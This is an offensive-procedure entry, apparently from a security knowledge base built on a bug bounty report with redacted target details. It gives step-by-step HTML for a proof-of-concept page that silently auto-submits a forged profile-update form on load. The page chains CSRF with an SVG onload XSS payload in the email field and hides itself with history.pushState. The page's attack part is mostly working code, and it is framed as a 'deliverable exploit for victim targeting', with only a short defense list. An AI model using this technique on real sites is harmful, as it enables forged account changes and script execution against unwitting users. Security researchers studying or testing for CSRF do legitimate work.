---
id: proc-uuid-step4
tags:
  - csrf-poc
  - xss-payload
type: procedure
tools:
  - '[[tools/Burp-Suite-Professional]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:32.084Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft Malicious CSRF HTML PoC with XSS

## Summary

This procedure creates an HTML proof-of-concept page that auto-submits a forged profile update form via CSRF, injecting an XSS payload into frm_email for JavaScript execution.

## Description

The PoC targets https://█████/████████ with hidden form fields mimicking the legitimate request. It includes the XSS payload in frm_email and uses JavaScript to push a fake state to history and submit the form on load, making the attack transparent to the victim.

## Requirements

1. Valid endpoint URL and parameters from analysis
2. XSS payload confirmed working
3. Text editor or Burp's built-in tools for HTML generation

## Defense

Defensive measures and detection strategies:

- Validate all POST requests with unique per-session CSRF tokens
- Block or log auto-submitted forms from unknown origins
- Educate users on phishing risks for malicious links

## Objectives

1. Forge a request that chains CSRF with XSS
2. Ensure silent submission without user input
3. Prepare deliverable exploit for victim targeting

## Instructions

### Step 1: Build HTML Form Structure

**Context**: Create the base form with hidden inputs.

Write HTML: <form id="poc" action="https://█████/████████" method="POST"><input type="hidden" name="action" value="F███████"><input type="hidden" name="token" value="███████"><input type="hidden" name="frm_email" value='nagli@wearehackerone.com"/><svg/onload=alert(document.domain)>'><input type="hidden" name="frm_zip5" value="12121"><input type="hidden" name="cmd_submit" value="Submit"></form>

### Step 2: Add Auto-Submit Script

**Context**: Automate form submission and history manipulation.

Append: <script>history.pushState('', '', '/'); document.getElementById('poc').submit();</script>

Save as .html and test locally or via Burp's Collaborator for validation.

**Expected Output**: Page loads, submits form, and triggers XSS alert on target.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite-Professional]]

## Tags

- csrf-poc
- xss-payload
